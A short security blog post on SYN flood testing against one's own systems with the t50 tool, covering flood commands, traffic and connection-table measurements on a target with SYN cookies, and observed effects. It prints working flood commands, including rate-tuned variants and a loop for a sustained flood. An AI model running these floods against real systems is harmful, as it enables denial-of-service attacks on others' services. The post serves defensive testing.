---
title: "Syn Flood Testing"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - Security
  - DDOS
---


Launching a SYN flood.

Everyone know DDOS attacks happen and of these SYN floods may be the simplest to organize for attackers. As a defender you don't want the first time you see this kind of traffic to be when you are under attack.

Launching a SYN attack against yourself.
1. You can learn some tools of the trade
2. You can test the weakness of your services
3. You can mitigate those weaknesses

A tool that is simple to use is [t50](https://github.com/foreni-packages/t50)

### Launching a SYN Flood

> ./t50 <DEST_IP> --flood -S --turbo

```
entering in flood mode...
activating turbo...
hit CTRL+C to break.
...
T50 5.4.1 successfully launched on May 28th 2013 13:09:24
```

### On the destination [NOTE: SYN Cookies are enabled]

#### Traffic

```
    tx eth0: 1168 b/s rx eth0: 528 b/s
    tx eth0: 1056 b/s rx eth0: 9160 b/s
    tx eth0: 8616 b/s rx eth0: 528 b/s
    tx eth0: 4944 b/s rx eth0: 528 b/s

        *syn flood starts**

    tx eth0: 10 Mb/s rx eth0: 12 Mb/s
    tx eth0: 36 Mb/s rx eth0: 43 Mb/s
    tx eth0: 38 Mb/s rx eth0: 46 Mb/s
    tx eth0: 39 Mb/s rx eth0: 47 Mb/s
    tx eth0: 39 Mb/s rx eth0: 47 Mb/s
```


```
    possible SYN flooding on port 5666. Sending cookies.
    possible SYN flooding on port 5666. Sending cookies.
```


#### Connection Table

```plaintext
   while true; do netstat -n -p TCP tcp | grep  SYN_RECV | wc -l >> /tmp/syn.log; sleep 2; done

    0
    5
    6
    3
    2
    ...
    **syn flood**
    ...
    142
    140
    144
    143
    142
    142
    143
    142
    141
    141
    140
    137
    138
    140
    142
    142
    142
    145
    144
```

#### Effect

* Massive lag in responsiveness for CLI commands
* Simple web server with (python -m SimpleHTTPServer) crashed
* Top shows ksoftirqd/0 pegging CPU

### Guidance on size of flood

```plaintext
./t50 <target> --threshold 10000 -S #4Mbps
./t50 <target> --threshold 20000 -S #8Mbps
./t50 <target> --threshold 40000 -S #16Mbps

#more or less consisten 4Mbps flood
for i in {1..100}; do ./t50 <target> --threshold 10000 -S; sleep 3; done
```

### Reference

[t50](https://github.com/foreni-packages/t50)

